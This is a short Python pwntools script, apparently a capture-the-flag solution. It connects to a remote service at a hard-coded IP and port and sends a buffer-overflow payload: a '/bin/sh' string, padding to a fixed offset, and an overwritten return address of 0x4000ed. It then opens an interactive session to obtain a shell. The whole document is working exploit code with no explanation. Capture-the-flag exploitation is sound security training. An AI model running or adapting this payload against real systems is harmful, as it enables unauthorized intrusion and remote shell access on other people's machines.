from pwn import *
host, port = "140.115.59.7", 11007
p = remote(host, port)

#p = process('./end')

s = '/bin/sh\x00'
s += 'a' * (0x128-len(s))
s += p64(0x4000ed)
s += 'a' * (0x141-len(s))
print(hex(len(s)))
p.sendline(s)
p.interactive()
